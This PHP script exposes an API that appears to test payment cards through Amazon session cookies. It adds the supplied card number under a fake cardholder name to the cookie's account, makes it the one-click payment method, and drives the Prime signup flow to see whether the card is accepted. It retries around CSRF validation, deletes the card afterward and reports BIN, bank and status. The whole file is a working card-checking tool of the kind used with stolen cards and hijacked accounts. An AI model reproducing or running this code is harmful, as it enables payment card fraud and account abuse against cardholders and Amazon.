<?php

require __DIR__ . '/vendor/autoload.php';
require __DIR__ . '/Utils/init.php';

use Utils\{Core, metaData};
use GuzzleHttp\Client;
use GuzzleHttp\Cookie\CookieJar;

set_time_limit(0);
ini_set('max_execution_time', '0');

ini_set('display_errors', '1');
ini_set('display_startup_errors', '1');
error_reporting(E_ALL);

set_error_handler(function ($severity, $message, $file, $line) {
    if (!(error_reporting() & $severity)) {
        return false; 
    }
    if (in_array($severity, [E_DEPRECATED, E_USER_DEPRECATED, E_NOTICE, E_USER_NOTICE, E_STRICT], true)) {
        return true; 
    }
    throw new ErrorException($message, 0, $severity, $file, $line);
});

register_shutdown_function(function () {
    $error = error_get_last();
    if ($error !== null && in_array($error['type'], [E_ERROR, E_PARSE, E_CORE_ERROR, E_COMPILE_ERROR])) {
        http_response_code(500);
        header('Content-Type: application/json');
        $payload = [
            'status' => false,
            'message' => 'Fatal server error',
            'error' => $error['message'],
            'file' => $error['file'],
            'line' => $error['line'],
        ];
        error_log('API fatal error: ' . json_encode($payload));
        echo json_encode($payload);
    }
});

// Set JSON response header
header('Content-Type: application/json');

// Enable CORS
header('Access-Control-Allow-Origin: *');
header('Access-Control-Allow-Methods: POST, OPTIONS');
header('Access-Control-Allow-Headers: Content-Type');

// Handle preflight requests
if ($_SERVER['REQUEST_METHOD'] === 'OPTIONS') {
    http_response_code(200);
    exit();
}

// Only accept POST requests
if ($_SERVER['REQUEST_METHOD'] !== 'POST') {
    http_response_code(405);
    echo json_encode(['status' => false, 'message' => 'Method Not Allowed. Use POST.']);
    exit();
}

// Get JSON data
$input = json_decode(file_get_contents('php://input'), true);

if (!$input) {
    http_response_code(400);
    echo json_encode(['status' => false, 'message' => 'Invalid JSON input']);
    exit();
}

$card = $input['card'] ?? null;
$cookie = $input['cookie'] ?? null;
$proxies = $input['proxies'] ?? null;

if (!$card || !$cookie) {
    http_response_code(400);
    echo json_encode(['status' => false, 'message' => 'Missing required fields: card and cookie']);
    exit();
}

final class CookieContext
{
    private string $cookieNonBuild;
    private string $cardNonParsed;
    private ?string $domain = null;
    private array  $cardData;
    private string $cookie;
    public ?string $tested_country = null;
    public ?string $original_country = null;
    private ?string $countryCode = null;
    private ?string $proxies;
    private Client $curl;
    private CookieJar $cookieJar;
    private \Faker\Generator $fakeData;
    private static array $ASSOC_MAP = [
        'ES' => 'esflex',
        'IT' => 'itflex',
        'US' => 'usflex',
        'DE' => 'deflex',
        'FR' => 'frflex',
        'UK' => 'ukflex',
        'MX' => 'mxflex',
        'CA' => 'caflex',
        'AU' => 'auflex',
        'BR' => 'brflex',
        'JP' => 'jpflex',
        'IN' => 'inflex',
        'NL' => 'nlflex',
        'PL' => 'plflex',
        'SG' => 'sgflex',
        'AE' => 'aeflex',
        'SA' => 'saflex',
        'TR' => 'trflex'
    ];

    public function __construct(string $string, string $cookie, ?string $proxies = null)
    {
        $this->cookieNonBuild = $cookie;
        $this->cardNonParsed  = $string;
        $this->fakeData       = Faker\Factory::create('en_US');
        $this->proxies        = $proxies !== null ? "http://$proxies" : null;
    }

    private static function finalUrlFrom($response, string $fallback): string
    {
        $history = $response->getHeader('X-Guzzle-Redirect-History');
        if (empty($history)) return $fallback;
        $urls = json_decode($history[0], true);
        return (is_array($urls) && count($urls) > 0) ? (string) end($urls) : $fallback;
    }

    public function buildFlowBilling()
    {
        $cardData   = Core::parseCardString($this->cardNonParsed);
        $cardInfo   = '';
        if (($cardData['status'] ?? false)) {
            $binInfo = Core::getBinInfo($cardData['number']);
            if (is_array($binInfo)) {
                $cardInfo = trim(implode(' ', array_filter([
                    $binInfo['brand'] ?? '', $binInfo['bank'] ?? '', $binInfo['type'] ?? '', $binInfo['level'] ?? '',
                ])) . ' (' . ($binInfo['country_name'] ?? 'Desconocido') . ')');
            }
        }
        $region = Core::extractRegionCode($this->cookieNonBuild);
        $detected_country = "US";
        if ($region) {
            foreach (Core::$COUNTRY_MAP as $k => $v) {
                if ($v["code"] === $region) {
                    $detected_country = $k;
                    break;
                }
            }
        }
        
        $this->original_country = $detected_country;
        $this->tested_country = "CA";
        $baseCountry = "US";
        
        $this->cookieNonBuild = Core::buildCookieAudible($this->cookieNonBuild, $baseCountry); // card is added on amazon.com (ca.php)
        $cookieData = Core::buildCookieData($this->cookieNonBuild);

        if (!$cardData['status'] || !$cookieData['status']) return ['status' => false, 'message' => $cardData['message'] ?? $cookieData['message']];

        $this->cardData    = $cardData;
        $this->cookie      = $cookieData['cookie'];
        $this->domain      = $cookieData['domain'];
        $this->countryCode = $cookieData['country_code'];
        $this->cookieJar   = Core::createCookieJarFromString($this->cookie, $this->domain);

        $assocHandle = self::$ASSOC_MAP[$this->countryCode] ?? 'usflex';

        $OPTIONS = [
            'http_errors' => false,
            'verify' => false,
            'cookies' => $this->cookieJar,
            'allow_redirects' => true,
            'timeout' => 90,
            'connect_timeout' => 15,
            'headers' => ['User-Agent' => 'Amazon.com/26.22.0.100 (Android/9/SM-G973N)', 'Connection' => 'keep-alive', 'Accept-Language' => $this->countryCode === 'JP' ? 'ja-JP,ja;q=0.9,en;q=0.8' : ($this->countryCode === 'AE' || $this->countryCode === 'SA' ? 'en-US,en;q=0.9,ar;q=0.8' : 'en-US,en;q=0.9')]
        ];

        if ($this->proxies !== null)
            $OPTIONS['proxy'] = ['http' => $this->proxies, 'https' => $this->proxies];

        $this->curl = new Client($OPTIONS);

        try {
            $headers1  = ['Upgrade-Insecure-Requests' => '1', 'User-Agent' => 'Amazon.com/26.22.0.100 (Android/9/SM-G973N)', 'Accept' => 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9', 'X-Requested-With' => 'com.amazon.mShop.android.shopping', 'Accept-Language' => $this->countryCode === 'JP' ? 'ja-JP,ja;q=0.9,en;q=0.8' : ($this->countryCode === 'AE' || $this->countryCode === 'SA' ? 'en-US,en;q=0.9,ar;q=0.8' : 'en-US,en;q=0.9')];
            $request1  = $this->curl->get(uri: "https://www." . $this->domain . "/ax/account/manage?openid.return_to=https%3A%2F%2Fwww." . $this->domain . "%2Fyour-account&openid.assoc_handle=" . $assocHandle . "&shouldShowPasskeyLink=true&passkeyEligibilityArb=455b1739-065e-4ae1-820a-d72c2583e302&passkeyMetricsActionId=781d7a58-8065-473f-ba7a-f516071c3093", options: ["headers" => $headers1]);
            $response1 = (string) $request1->getBody();
        } catch (Throwable $e) {
            return ['status' => false, 'message' => 'Invalid Cookie ⚠️: No relation with Amazon server, try again later!'];
        }

        if (strpos($response1, "Sorry, your passkey isn't working. There might be a problem with the server. Sign in with your password or try your passkey again later."))
            return ['status' => false, 'message' => 'Invalid Cookie: Unable to access account page, refresh ur cookie!'];

        $headers2 = ['Upgrade-Insecure-Requests' => '1', 'User-Agent' => 'Mozilla/5.0 (Linux; Android 9; SM-G973N Build/PQ3A.190605.09261202; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/91.0.4472.114 Mobile Safari/537.36', 'Accept' => 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9', 'X-Requested-With' => 'com.amazon.dee.app'];
        $request2 = $this->curl->get(uri: "https://www." . $this->domain . "/mn/dcw/myx/settings.html?route=updatePaymentSettings&ref_=kinw_drop_coun&ie=UTF8&client=deeca", options: ["headers" => $headers2]);
        $response2 = (string) $request2->getBody();
        $csrfToken = Core::extractBetween($response2, 'csrfToken = "', '"');

        if (!$csrfToken) return [
            'status' => false,
            'message' => 'Cookie dead! ❌ Refresh your cookie - Missing CSRF Token.',
            'debug_html' => substr($response2, 0, 10000)
        ];

        $headers3  = ['Accept'  => 'application/json, text/plain, */*', 'User-Agent' => 'Mozilla/5.0 (Linux; Android 9; SM-G973N Build/PQ3A.190605.09261202; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/91.0.4472.114 Mobile Safari/537.36', 'client' => 'MYXSettings', 'Content-Type' => 'application/x-www-form-urlencoded', 'Origin' => 'https://www.' . $this->domain, 'X-Requested-With' => 'com.amazon.dee.app', "Referer" => "https://www.$this->domain/mn/dcw/myx/settings.html?route=updatePaymentSettings&ref_=kinw_drop_coun&ie=UTF8&client=deeca"];
        $payload3  = 'data=%7B%22param%22%3A%7B%22AddPaymentInstr%22%3A%7B%22cc_CardHolderName%22%3A%22' . $this->fakeData->firstName() . '+' . $this->fakeData->lastName() . '%22%2C%22cc_ExpirationMonth%22%3A%22' . intval($this->cardData['month']) . '%22%2C%22cc_ExpirationYear%22%3A%22' . $this->cardData['year'] . '%22%7D%7D%7D&csrfToken=' . urlencode($csrfToken) . '&addCreditCardNumber=' . $this->cardData['number'];
        $request3  = $this->curl->post(uri: "https://www." . $this->domain . "/hz/mycd/ajax", options: ["headers" => $headers3, 'body' => $payload3]);
        $response3 = (string) $request3->getBody();
        $paymentId = Core::extractBetween($response3, '"paymentInstrumentId":"', '"');

        if (!$paymentId) return [
            'status' => false,
            'message' => 'Cookie dead! ❌ Refresh your cookie - Card addition failed.'
        ];

        $addressId = metaData::getBillingAddressId($this->curl, $csrfToken, $this->domain);
        $addrAttempts = 0;
        while (!$addressId && $addrAttempts < 2) {
            $addrAttempts++;
            // Todas las cookies se convierten a US y la direccion se agrega en amazon.com
            $addAddress = metaData::addBillingAddress($this->curl, $this->domain, 'US');

            // Aunque el POST redirija a la home, puede haberse guardado — verificar antes de fallar
            sleep(2);
            $addressId = metaData::getBillingAddressId($this->curl, $csrfToken, $this->domain);

            if (!$addressId && $addAddress['status'] === false && $addrAttempts >= 2) {
                return [
                    'status' => false,
                    'message' => 'Try again! - Failed to add billing address: ' . $addAddress['message']
                ];
            }
        }
        if (!$addressId) return [
            'status' => false,
            'message' => 'Cookie dead! ❌ Refresh your cookie - Address ID not retrieved.'
        ];

        $headers5  = ['Accept' => 'application/json, text/plain, */*', 'User-Agent' => 'Mozilla/5.0 (Linux; Android 9; SM-G973N Build/PQ3A.190605.09261202; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/91.0.4472.114 Mobile Safari/537.36', 'client' => 'MYXSettings', 'Content-Type' => 'application/x-www-form-urlencoded', 'Origin' => 'https://www.' . $this->domain, 'X-Requested-With' => 'com.amazon.dee.app', "Referer" => "https://www." . $this->domain . "/mn/dcw/myx/settings.html?route=updatePaymentSettings&ref_=kinw_drop_coun&ie=UTF8&client=deeca"];
        $payload5  = 'data=%7B%22param%22%3A%7B%22SetOneClickPayment%22%3A%7B%22paymentInstrumentId%22%3A%22' . $paymentId . '%22%2C%22billingAddressId%22%3A%22' . $addressId . '%22%2C%22isBankAccount%22%3Afalse%7D%7D%7D&csrfToken=' . urlencode($csrfToken);
        $request5  = $this->curl->post(uri: "https://www." . $this->domain . "/hz/mycd/ajax", options: ["headers" => $headers5, 'body' => $payload5]);
        $response5 = (string) $request5->getBody();

        if (!strpos($response5, '"success":true,"paymentInstrumentId":"')) return ['status' => false, 'message' => 'Cookie dead! ❌ Refresh your cookie. - Payment Instrument not set.'];

        $headers6  = ["Host" => "www." . $this->domain, 'Upgrade-Insecure-Requests' => '1', 'User-Agent' => 'Amazon.com/26.22.0.100 (Android/9/SM-G973N)', 'Accept' => 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9', 'X-Requested-With' => 'com.amazon.mShop.android.shopping'];
        $request6  = $this->curl->get(uri: "https://www." . $this->domain . "/cpe/yourpayments/wallet?ref_=ya_mshop_mpo", options: ["headers" => $headers6]);
        $response6 = (string) $request6->getBody();
        $wigstst    = Core::extractBetween($response6, 'testAjaxAuthenticationRequired":"false","clientId":"YA:Wallet","serializedState":"', '"');
        $marketId   = Core::extractBetween($response6, 'data-marketplaceid="', '"');
        $customerId = Core::extractBetween($response6, 'customerId":"', '"');
        $walletSessionId = Core::extractBetween($response6, '"sessionId":"', '"');
        $widgetInstanceId = Core::extractBetween($response6, 'widgetInstanceId":"', '"');

        if (!$wigstst) return ['status' => false, 'message' => 'Cookie dead! ❌ Refresh your cookie. - Wallet Page not accessed.'];

        $headers7  = ["Host" => "www." . $this->domain, 'Accept' => "application/json, text/javascript, */*; q=0.01", 'X-Requested-With' => 'XMLHttpRequest', 'Widget-Ajax-Attempt-Count' => '0', 'APX-Widget-Info' => 'YA:Wallet/mobile/' . $widgetInstanceId, 'User-Agent' => 'Amazon.com/26.22.0.100 (Android/9/SM-G973N)', 'Content-Type' => 'application/x-www-form-urlencoded; charset=UTF-8', 'Origin' => 'https://www.' . $this->domain, 'Referer' => 'https://www.' . $this->domain . '/cpe/yourpayments/wallet?ref_=ya_mshop_mpo'];
        $payload7  = 'ppw-jsEnabled=true&ppw-widgetState=' . $wigstst . '&ppw-widgetEvent=ViewPaymentMethodDetailsEvent&ppw-instrumentId=' . $paymentId;
        $request7  = $this->curl->post(uri: "https://www." . $this->domain . "/payments-portal/data/widgets2/v1/customer/" . $customerId . "/continueWidget", options: ["headers" => $headers7, 'body' => $payload7]);
        $response7 = (string) $request7->getBody();
        $paymentMethod = Core::extractBetween($response7, '"paymentMethodId\":\"', '\"');

        if (!$paymentMethod) {
            file_put_contents('debug_payment_method.html', $response7);
            return ['status' => false, 'message' => 'Cookie dead! ❌ Refresh your cookie - Payment Method not found.', 'debug_html' => substr($response7, 0, 10000)];
        }
        $primeCookie = Core::buildCookieAudible($this->cookieNonBuild, 'CA');
        $primeData   = Core::buildCookieData($primeCookie);
        if ($primeData['status'] === false) {
            return ['status' => false, 'message' => $primeData['message'] ?? 'Failed to build CA cookie.'];
        }

        $primeDomain    = $primeData['domain'];
        $primeCookieJar = Core::createCookieJarFromString($primeData['cookie'], $primeDomain);

        $primeOptions = [
            'http_errors' => false,
            'verify' => false,
            'cookies' => $primeCookieJar,
            'allow_redirects' => true,
            'timeout' => 90,
            'connect_timeout' => 15,
            'headers' => ['User-Agent' => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36', 'Connection' => 'keep-alive', 'Accept-Language' => 'en-US,en;q=0.9']
        ];

        if ($this->proxies !== null)
            $primeOptions['proxy'] = ['http' => $this->proxies, 'https' => $this->proxies];

        $primeCurl = new Client($primeOptions);

        $headers8  = ["Host" => "www." . $primeDomain, "content-type" => "application/x-www-form-urlencoded"];
        $payload8  = "clientId=debugClientId&ingressId=PrimeDefault&primeCampaignId=PrimeDefault&redirectURL=gp%2Fhomepage.html&benefitOptimizationId=default&planOptimizationId=default&inline=1&disableCSM=1";
        $request8  = $primeCurl->post(uri: "https://www." . $primeDomain . "/gp/prime/pipeline/membersignup", options: ["headers" => $headers8, 'body' => $payload8]);
        $response8 = (string) $request8->getBody();

        $authToken2 = Core::extractBetween($response8, 'Subs:Prime&quot;,&quot;serializedState&quot;:&quot;', '&');
        $primeSessionId = Core::extractBetween($response8, 'Subs:Prime&quot;,&quot;session&quot;:&quot;', '&');
        $customerID = Core::extractBetween($response8, 'customerId&quot;:&quot;', '&');

        if (!$authToken2)
            return ['status' => false, 'message' => 'Cookie dead! ❌ Refresh your cookie - Prime Page not accessed.'];

        $headers9  = ["Host" => "www." . $primeDomain, 'X-Requested-With' => 'XMLHttpRequest', 'Apx-Widget-Info' => 'Subs:Prime/desktop/LFqEJMZmYdCd', 'User-Agent' => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36', 'Content-Type' => 'application/x-www-form-urlencoded; charset=UTF-8', "Origin" =>  "https://www." . $primeDomain . "", "Referer" => "https://www." . $primeDomain . "/gp/prime/pipeline/confirm"];
        $payload9  = "ppw-widgetEvent%3AShowPreferencePaymentOptionListEvent%3A%7B%22instrumentId%22%3A%5B%22" . $paymentId . "%22%5D%2C%22instrumentIds%22%3A%5B%22" . $paymentId . "%22%5D%7D=change&ppw-jsEnabled=true&ppw-widgetState=" . $authToken2 . "&ie=UTF-8";
        $request9  = $primeCurl->post(uri: "https://www." . $primeDomain . "/payments-portal/data/widgets2/v1/customer/" . $customerID . "/continueWidget", options: ["headers" => $headers9, 'body' => $payload9]);
        $response9 = (string) $request9->getBody();
        $authToken3 = Core::extractBetween($response9, 'hidden\" name=\"ppw-widgetState\" value=\"', '\"');
        $authToken4 = Core::extractBetween($response9, 'data-instrument-id=\"', '\"');

        if (!$authToken3)
            return ['status' => false, 'message' => 'Cookie dead! ❌ Refresh your cookie. - Card Page not accessed.'];

        $headers10  = ["Host" => "www." . $primeDomain, 'X-Requested-With' => 'XMLHttpRequest', 'Apx-Widget-Info' => 'Subs:Prime/desktop/r9R8zQ8Dgh1b', 'User-Agent' => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36', 'Content-Type' => 'application/x-www-form-urlencoded; charset=UTF-8', "Origin" => "https://www." . $primeDomain, "Referer" => "https://www." . $primeDomain . "/gp/prime/pipeline/membersignup"];
        $payload10  = "ppw-widgetEvent%3APreferencePaymentOptionSelectionEvent=&ppw-jsEnabled=true&ppw-widgetState=" . $authToken3 . "&ie=UTF-8&ppw-" . $authToken4 . "_instrumentOrderTotalBalance=%7B%7D&ppw-instrumentRowSelection=instrumentId%3D" . $paymentId . "%26isExpired%3Dfalse%26paymentMethod%3DCC%26tfxEligible%3Dfalse&ppw-" . $paymentId . "_instrumentOrderTotalBalance=%7B%7D";
        $request10  = $primeCurl->post(uri: "https://www." . $primeDomain . "/payments-portal/data/widgets2/v1/customer/" . $customerID . "/continueWidget", options: ["headers" => $headers10, 'body' => $payload10]);
        $response10 = (string) $request10->getBody();
        $walletId   = Core::extractBetween($response10, 'hidden\" name=\"ppw-widgetState\" value=\"', '\"');

        if (!$walletId)
            return ['status' => false, 'message' => 'Cookie dead! ❌ Refresh your cookie. - Wallet Page not accessed.'];

        $headers12  = ["Host" => "www." . $primeDomain, "User-Agent" => "Mozilla/5.0 (iPhone; CPU iPhone OS " . rand(10, 99) . "_1_2 like Mac OS X) AppleWebKit/" . rand(100, 999) . ".1.15 (KHTML, like Gecko) Version/17.1.2 Mobile/15E" . rand(100, 999) . " Safari/" . rand(100, 999) . ".1", "content-type" => "application/x-www-form-urlencoded"];
        $payload11  = "ppw-jsEnabled=true&ppw-widgetState=" . $walletId . "&ppw-widgetEvent=SavePaymentPreferenceEvent";
        $request11  = $primeCurl->post(uri: "https://www." . $primeDomain . "/payments-portal/data/widgets2/v1/customer/$customerID/continueWidget", options: ["headers" => $headers12, 'body' => $payload11]);
        $response11 = (string) $request11->getBody();
        $walletId   = Core::extractBetween($response11, 'preferencePaymentMethodIds":"[\"', '\"');

        if (!$walletId)
            return ['status' => false, 'message' => 'Cookie dead! ❌ Refresh your cookie. - Wallet Page not accessed.'];

        $hardVetCsrfToken = null;
        if (preg_match('/name=["\']wlp-hardvet-csrf-token["\']\s+content=["\']([^"\']+)["\']/i', $response8, $matches)) {
            $hardVetCsrfToken = $matches[1];
        } elseif (preg_match('/content=["\']([^"\']+)["\']\s+name=["\']wlp-hardvet-csrf-token["\']/i', $response8, $matches)) {
            $hardVetCsrfToken = $matches[1];
        }

        $headers12  = ['Host' => 'www.' . $primeDomain, 'Upgrade-Insecure-Requests' => '1', 'User-Agent' => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36'];
        
        $actionUrl = "https://www." . $primeDomain . "/hp/wlp/pipeline/actions";
        $actionParams = "redirectURL=L2dwL3ByaW1l&paymentsPortalPreferenceType=PRIME&paymentsPortalExternalReferenceID=prime&wlpLocation=prime_confirm&locationID=prime_confirm&primeCampaignId=SlashPrime&paymentMethodId=" . $walletId . "&actionPageDefinitionId=WLPAction_AcceptOffer_HardVet&cancelRedirectURL=Lw&paymentMethodIdList=" . $walletId . "&location=prime_confirm&session-id=" . $primeSessionId;

        $finalUrl = '';

        if ($hardVetCsrfToken) {
            $headers12['Content-Type'] = 'application/x-www-form-urlencoded';
            $payload12 = $actionParams . "&hardVetCsrfToken=" . urlencode($hardVetCsrfToken);
            $request12 = $primeCurl->post(uri: $actionUrl, options: [
                'headers' => $headers12,
                'body' => $payload12,
                'allow_redirects' => ['max' => 10, 'track_redirects' => true],
            ]);
            $response12 = (string) $request12->getBody();
            $finalUrl   = self::finalUrlFrom($request12, $actionUrl);
        } else {
            $response12 = '';
        }

        $isCsrf = stripos($response12 . ' ' . $finalUrl, 'HardVetCsrfValidationFailed') !== false;

        if (!$hardVetCsrfToken || $isCsrf) {
            $hardvetAttempts = [
                ['session' => $primeSessionId,  'follow' => true],
                ['session' => $walletSessionId, 'follow' => true],
                ['session' => $primeSessionId,  'follow' => false],
            ];

            foreach ($hardvetAttempts as $attemptIndex => $attempt) {
                $params    = preg_replace('/&session-id=.*$/', '&session-id=' . $attempt['session'], $actionParams);
                $targetUrl = $actionUrl . '?' . $params;

                if ($attempt['follow']) {
                    $request12 = $primeCurl->get(uri: $targetUrl, options: [
                        'headers' => $headers12,
                        'allow_redirects' => ['max' => 10, 'track_redirects' => true],
                    ]);
                    $response12 = (string) $request12->getBody();
                    $finalUrl   = self::finalUrlFrom($request12, $targetUrl);
                } else {
                    $request12 = $primeCurl->get(uri: $targetUrl, options: [
                        'headers' => $headers12,
                        'allow_redirects' => false,
                    ]);
                    $status    = $request12->getStatusCode();
                    $location  = $request12->getHeaderLine('Location');
                    if ($status >= 300 && $status < 400 && $location !== '' && stripos($location, 'HardVetCsrfValidationFailed') === false) {
                        $request12 = $primeCurl->get(uri: $location, options: [
                            'headers' => $headers12,
                            'allow_redirects' => ['max' => 10, 'track_redirects' => true],
                        ]);
                        $response12 = (string) $request12->getBody();
                        $finalUrl   = self::finalUrlFrom($request12, $location);
                    } else {
                        $response12 = (string) $request12->getBody();
                        $finalUrl   = $location !== '' ? $location : $targetUrl;
                    }
                }

                $isCsrf = stripos($response12 . ' ' . $finalUrl, 'HardVetCsrfValidationFailed') !== false;
                if (!$isCsrf) break;
                if ($attemptIndex < count($hardvetAttempts) - 1) sleep(1);
            }
        }
        
        $deletePaymentProcess = metaData::deletePaymentMethod($this->cookieNonBuild, $paymentMethod, $this->proxies);

        $result = Core::buildFlowBillingResult($response12, $deletePaymentProcess, $this->countryCode, $this->cardData, $finalUrl);
        if (is_array($result)) {
            $result['card_info'] = $cardInfo;
        }
        return $result;
    }

    public function getGateway(): string
    {
        return 'Amazon Prime';
    }
}

try {
    $model = new CookieContext($card, $cookie, $proxies);
    $result = $model->buildFlowBilling();
    if (is_array($result)) {
        $result['gateway'] = $model->getGateway();
    }

    http_response_code(200);
    echo json_encode($result);
} catch (Throwable $e) {
    $payload = [
        'status' => false,
        'message' => 'Server error',
        'error' => $e->getMessage(),
    ];
    error_log('API exception: ' . $e->getMessage() . ' in ' . $e->getFile() . ':' . $e->getLine());
    http_response_code(500);
    echo json_encode($payload);
}